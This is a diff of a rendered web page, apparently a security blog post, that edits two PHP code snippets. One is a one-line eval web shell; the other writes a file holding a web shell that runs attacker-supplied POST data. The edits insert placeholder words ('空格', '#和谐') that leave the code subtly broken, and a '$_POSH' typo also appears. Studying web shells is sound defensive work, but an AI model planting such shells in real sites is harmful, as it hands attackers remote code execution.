@@ -419,7 +419,7 @@
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-BASH" data-lang="BASH"><span class="line"><span class="cl">&lt;?php
-</span></span><span class="line"><span class="cl"> eval<span class="o">(</span><span class="nv">$_POSH</span><span class="o">[</span><span class="s2">&#34;123&#34;</span><span class="o">])</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">空格eval<span class="o">(</span><span class="nv">$_POSH</span><span class="o">[</span><span class="s2">&#34;123&#34;</span><span class="o">])</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">?&gt;
 </span></span></code></pre></td></tr></table>
 </div>
@@ -471,9 +471,11 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
+</span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-BASH" data-lang="BASH"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl"><span class="c1">#和谐</span>
 </span></span><span class="line"><span class="cl">fputs<span class="o">(</span>fopen<span class="o">(</span><span class="s2">&#34;426.php&#34;</span>,<span class="s2">&#34;w&#34;</span><span class="o">)</span>,<span class="s1">&#39;&lt;?php eval($_POST[&#34;123&#34;]);空格?&gt;&#39;</span><span class="o">)</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">?&gt; 
 </span></span></code></pre></td></tr></table>
